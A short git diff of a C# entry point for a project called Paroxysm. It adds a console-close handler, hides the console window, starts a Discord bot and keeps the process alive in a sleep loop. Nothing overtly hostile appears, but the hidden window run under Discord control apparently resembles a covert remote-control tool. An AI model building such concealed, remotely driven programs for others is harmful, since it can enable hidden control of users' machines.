@@ -1,7 +1,6 @@
-﻿using Paroxysm.API;
+﻿using Paroxysm.Discord;
+using Paroxysm.Discord.Events;
 using Paroxysm.Hooks.Actions;
-using Paroxysm.Tools;
-using System.Diagnostics;
 
 namespace Paroxysm;
 
@@ -9,14 +8,20 @@ internal abstract class Program
 {
     public static void Main(string[] args)
     {
+        // Add application close handler
+        OnBeforeCloseEvent.AppCloseHandler += OnBeforeCloseEvent.SendClosingMessage;
+        OnBeforeCloseEvent.SetConsoleCtrlHandler(OnBeforeCloseEvent.AppCloseHandler, true);
+
         // Hide console
         ConsoleAction.Follow();
 
         // Initialize discord bot
         DiscordAPI.Init().GetAwaiter().GetResult();
 
-        // Before Close Event
-        Console.CancelKeyPress += MonitorProcess.OnBeforeClose;
-        Process.GetCurrentProcess().Exited += MonitorProcess.SendClosingMessage;   
+        // Hold the console so it does’nt run off the end
+        while (!OnBeforeCloseEvent.IsProgramExited)
+        {
+            Thread.Sleep(500);
+        }
     }
 }
